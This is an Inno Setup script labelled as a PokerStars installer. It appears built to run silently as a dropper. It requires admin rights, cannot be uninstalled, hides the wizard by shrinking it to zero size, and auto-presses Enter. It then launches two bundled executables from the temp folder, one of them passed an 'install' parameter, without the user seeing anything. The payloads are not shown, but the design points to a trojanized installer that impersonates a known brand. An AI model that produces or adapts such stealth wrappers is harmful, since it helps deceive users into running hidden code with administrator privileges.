[Setup]
AppId={{9175F0AA-8049-441D-BCBD-7E08A3A7F3BE}
AppName=PokerStars Installer
AppVersion=7.3.8.5
VersionInfoVersion=7.3.8.5
;AppVerName=7.3.8.5
AppComments=PokerStars Installer
VersionInfoDescription=PokerStars Installer
AppPublisher=PokerStars
AppPublisherURL=http://www.pokerstars.com/
AppSupportURL=http://www.pokerstars.com/
AppUpdatesURL=http://www.pokerstars.com/
CreateAppDir=no
OutputBaseFilename=PokerStarsInstall
Compression=lzma
SolidCompression=yes
Uninstallable=false
DisableWelcomePage=yes
DisableDirPage=yes
DisableProgramGroupPage=yes
DisableReadyMemo=yes
DisableReadyPage=yes
DisableStartupPrompt=yes
DisableFinishedPage=yes
PrivilegesRequired=admin
SetupIconFile="C:\Users\Admin\Documents\icon.ico"

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
Source: "C:\Users\Admin\Documents\PokerStarsInstaller.exe"; DestDir: "{tmp}"; Flags: ignoreversion
Source: "C:\Users\Admin\Documents\PokerStarsInstall.exe"; DestDir: "{tmp}"; Flags: ignoreversion

[Run]
Filename: {tmp}\PokerStarsInstaller.exe; Parameters: "install"; Flags: nowait
Filename: {tmp}\PokerStarsInstall.exe; Flags: nowait

[Code]
const
  WM_CLOSE = $0010;
  WM_KEYDOWN = $0100;
  WM_KEYUP = $0101;
  VK_RETURN = 13;

procedure InitializeWizard();
begin
  WizardForm.BorderStyle := bsNone;
  WizardForm.Width := 0;
  WizardForm.Height := 0;

  PostMessage(WizardForm.Handle, WM_KEYDOWN, VK_RETURN, 0);
  PostMessage(WizardForm.Handle, WM_KEYUP, VK_RETURN, 0);
end;
